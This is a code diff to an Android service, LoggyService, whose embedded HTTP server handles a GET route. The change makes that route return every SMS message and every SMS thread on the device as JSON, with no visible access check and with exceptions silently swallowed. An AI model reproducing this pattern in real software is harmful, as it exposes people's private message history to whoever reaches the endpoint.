@@ -152,6 +152,12 @@ public class LoggyService extends Service {
         j.put("info", s.getInfo().toString());
         return j;
     }
+
+    JSONObject jsonThread(SMSThread s) throws JSONException {
+        JSONObject j = new JSONObject();
+        j.put("info", s.getInfo().toString());
+        return j;
+    }
     
     public void sms(String regex){
     	mServer.addAction("GET", regex, new HttpServerRequestCallback() {
@@ -165,24 +171,33 @@ public class LoggyService extends Service {
 				if (d.length>1){ contact = d[0];}
 				SmsManager smsManager = new SmsManager(getApplicationContext());
 				
-				ArrayList<Sms> SmsList = smsManager.getsms(null,null);
+                //get last sms
+				ArrayList<Sms> smsList = smsManager.getsms(null,null);
 				JSONArray s = new JSONArray();
-				for(Sms sms: SmsList){
+				for(Sms sms: smsList){
 	                try {
                         s.put(jsonSms(sms));
                     }
-                    catch (JSONException e) {
-                    }
+                    catch (JSONException e) {}
 				}  
-
+                //get All threads
+                ArrayList<SMSThread> threadList = smsManager.getThreads(null);
+                JSONArray t = new JSONArray();
+                for(SMSThread thread: threadList){
+                    try {
+                        t.put(jsonThread(thread));
+                    }
+                    catch (JSONException e) {}
+                }
+                
                 JSONObject ret = new JSONObject();
                 try {
-                    ret.put("smss", s);         
+                    ret.put("smss", s);
+                    ret.put("threads", t);
                 }
-                catch (Exception ex) {
-                }
+                catch (Exception ex) {}
                 response.send(ret);
-                
+
                 return;
 			}
 		});
